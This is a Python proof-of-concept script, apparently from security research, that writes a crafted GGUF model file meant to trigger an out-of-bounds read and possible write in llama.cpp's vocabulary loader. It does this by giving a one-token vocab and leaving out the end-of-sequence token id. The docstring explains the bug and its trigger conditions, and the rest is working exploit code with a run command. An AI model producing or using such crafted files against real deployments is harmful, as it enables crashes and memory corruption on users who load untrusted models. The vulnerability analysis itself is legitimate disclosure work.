#!/usr/bin/env python3
"""
Craft a GGUF that triggers an OOB read/write in llama_vocab::impl::load.

Bug: SPM tokenizer ("llama") sets default `special_eos_id = 2`. If the GGUF
omits `tokenizer.ggml.eos_token_id`, this default is kept WITHOUT checking
against `id_to_token.size()`. The sanity check at line ~2855 inserts
`special_eos_id` into `special_eog_ids` unconditionally. Then the EOG loop
at line 2867 accesses `id_to_token[tid]` (operator[], no bounds check) with
`tid = 2` — OOB read. If the OOB memory happens to match "<|end|>", a
subsequent `id_to_token[end_id].attr = ...` is an OOB WRITE.

Trigger: arch=llama, n_tokens=1 (vocab with only "<pad>"), no eos_token_id key.

Run:  python3 craft_oob_vocab_eos.py out.gguf
"""
import sys, os
from pathlib import Path
gguf_path = Path(__file__).resolve().parent.parent / "llama.cpp" / "gguf-py"
sys.path.insert(0, str(gguf_path))
import gguf

V = gguf.GGUFValueType

def main():
    out = sys.argv[1] if len(sys.argv) > 1 else "models/crafted/vocab_eos_oob.gguf"
    os.makedirs(os.path.dirname(out) or ".", exist_ok=True)

    w = gguf.GGUFWriter(out, arch="llama")

    def kv(key, val, t):
        w.add_key_value(key, val, t)

    # ---- base loader hparams (must pass n_layer_all guard) ----
    kv("llama.context_length", 2048, V.UINT32)
    kv("llama.embedding_length", 64, V.UINT32)
    kv("llama.block_count", 1, V.UINT32)
    kv("llama.attention.head_count", 1, V.UINT32)
    kv("llama.attention.head_count_kv", 1, V.UINT32)
    kv("llama.feed_forward_length", 128, V.UINT32)
    kv("llama.attention.layer_norm_rms_epsilon", 1e-5, V.FLOAT32)
    kv("llama.rope.dimension_count", 64, V.UINT32)

    # ---- minimal 1-token vocab (SPM) ----
    # SPM defaults: special_bos_id=1, special_eos_id=2, special_unk_id=0
    # By NOT providing tokenizer.ggml.eos_token_id, the default eos_id=2 is kept.
    # With n_tokens=1, id_to_token[2] is OOB.
    kv("tokenizer.ggml.model", "llama", V.STRING)
    w.add_key_value("tokenizer.ggml.tokens", ["<pad>"], V.ARRAY, sub_type=V.STRING)
    w.add_key_value("tokenizer.ggml.scores", [0.0], V.ARRAY, sub_type=V.FLOAT32)
    w.add_key_value("tokenizer.ggml.token_type", [0], V.ARRAY, sub_type=V.INT32)
    # INTENTIONALLY OMIT: tokenizer.ggml.bos_token_id, tokenizer.ggml.eos_token_id
    # → SPM defaults special_bos_id=1, special_eos_id=2 are kept
    # → special_eos_id=2 inserted into special_eog_ids
    # → EOG loop: id_to_token[2] → OOB

    w.write_header_to_file()
    w.write_kv_data_to_file()
    w.write_ti_data_to_file()
    w.close()
    print(f"Written {out} (SPM 1-token vocab, no eos_token_id → default eos_id=2 OOB)")

if __name__ == "__main__":
    main()